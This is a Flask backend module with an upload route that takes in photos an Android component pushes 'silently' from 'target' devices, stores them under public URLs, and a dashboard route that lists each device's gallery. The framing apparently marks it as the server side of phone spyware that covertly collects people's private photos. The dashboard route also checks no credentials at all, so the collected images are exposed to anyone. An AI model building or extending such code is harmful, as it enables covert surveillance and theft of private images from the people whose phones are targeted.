import os
import uuid
from flask import Blueprint, request, jsonify
from werkzeug.utils import secure_filename
from database import supabase

gallery_bp = Blueprint('gallery', __name__)

# =========================================================================
# 🚀 1. RECEIVE MEDIA FROM ANDROID (MediaSyncEngine)
# =========================================================================
@gallery_bp.route('/api/gallery/upload', methods=['POST'])
def upload_gallery_media():
    """
    Android ka MediaSyncEngine silently newly added photos yahan push karega.
    """
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    
    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No media payload attached."}), 400
        
    file = request.files['file']
    if file.filename == '':
        return jsonify({"status": "error", "message": "Empty media payload."}), 400

    try:
        # 1. Target Validation
        dev_query = supabase.table('devices').select('id').eq('device_token', token).execute()
        if not dev_query.data:
            return jsonify({"status": "error", "message": "Unauthorized target node."}), 403
            
        device_id = dev_query.data[0]['id']
        
        # 2. File Name Secure & Path Generation
        filename = secure_filename(file.filename)
        # Unique UUID lagaya hai taaki same naam ki 2 photos aapas mein overwrite na ho jayein
        storage_path = f"{device_id}/{uuid.uuid4()}_{filename}"
        
        # 3. Read & Upload to Supabase Storage Bucket ('gallery')
        file_bytes = file.read()
        supabase.storage.from_('gallery').upload(storage_path, file_bytes)
        
        # 4. Extract Public URL
        file_url = supabase.storage.from_('gallery').get_public_url(storage_path)

        # 5. Inject metadata into database
        supabase.table('gallery').insert({
            "device_id": device_id,
            "file_name": filename,
            "file_url": file_url,
            "media_type": "image" # Future-proof for videos
        }).execute()

        print(f"[GALLERY] Media '{filename}' synced securely for device {device_id}", flush=True)

        return jsonify({
            "status": "success", 
            "message": "Media block uploaded & mapped.",
            "url": file_url
        }), 200

    except Exception as e:
        print(f"[GALLERY CRASH] Media pipeline anomaly: {str(e)}", flush=True)
        return jsonify({"status": "error", "message": "Media pipeline failed."}), 500


# =========================================================================
# 🚀 2. DASHBOARD API: GET GALLERY MEDIA (Frontend calling Backend)
# =========================================================================
@gallery_bp.route('/api/devices/<device_id>/gallery', methods=['GET'])
def get_device_gallery(device_id):
    """
    Dashboard (gallery.html) is route se images fetch karega grid me dikhane ke liye.
    """
    try:
        # Latest photos ko sabse upar (descending) bhejenge
        query = supabase.table('gallery').select('*').eq('device_id', device_id).order('created_at', desc=True).execute()
        return jsonify({"status": "success", "data": query.data}), 200
    except Exception as e:
        print(f"[GALLERY CRASH] Fetch anomaly: {str(e)}", flush=True)
        return jsonify({"status": "error", "message": "Database read failed."}), 500
